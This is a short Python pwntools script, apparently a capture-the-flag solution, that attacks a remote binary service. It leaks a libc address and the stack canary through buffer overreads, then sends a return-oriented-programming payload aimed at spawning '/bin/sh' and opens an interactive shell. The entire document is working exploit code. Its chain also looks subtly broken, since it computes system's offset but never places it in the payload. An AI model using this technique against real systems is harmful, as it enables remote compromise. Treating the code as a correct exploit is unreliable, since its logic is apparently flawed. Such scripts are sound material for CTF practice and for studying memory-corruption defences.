from pwn import *
context.update(arch='amd64', os='linux', log_level='debug')

while True:
    #p = process('kikoo_4_ever')
    p = remote('sharkyctf.xyz', 20337)


    p.sendlineafter('> ', 'T')
    p.sendlineafter('> ', 'Q')
    p.sendlineafter('> ', '2')


    p.sendafter(': ', cyclic(56))
    p.recvuntil('wrote:\n')
    libc_leak = u64(p.recv(64)[56:56+6].ljust(8, '\x00'))
    libc_base = libc_leak - 0x94038
    log.info('libc_leak: ' + hex(libc_leak))
    log.info('libc_base: ' + hex(libc_base))
    p.sendlineafter('n)', 'y')

    p.sendafter(': ', cyclic(521))
    p.recvuntil('wrote:\n')
    _canary = u64(p.recv(528)[521:].rjust(8, '\x00'))
    log.info('canary: ' + hex(_canary))
    p.sendlineafter('n)', 'n')


    libc = ELF('libc-2.27.so')
    offset_system = libc.symbols['system']
    binsh = libc.search('/bin/sh').next() + libc_base
    pRdi_ret = 0x000000000002155f + libc_base
    ret  = 0x00000000000008aa + libc_base



    
    payload = p64(0) #go_on 
    payload += cyclic(72) #choic, tmp[64]
    payload += p64(_canary)
    payload += p64(ret)*10
    payload += p64(pRdi_ret) + p64(binsh)
    payload += p64(_canary)      
    payload = cyclic(528-len(payload)) + payload
    p.sendafter(': ', payload)
    p.sendlineafter('n)', 'y')


    p.sendlineafter('> ', '9')
    _recv = p.recvrepeat(1)
    if _recv.find('terminated') != -1:
        p.close()
        continue
    p.interactive()




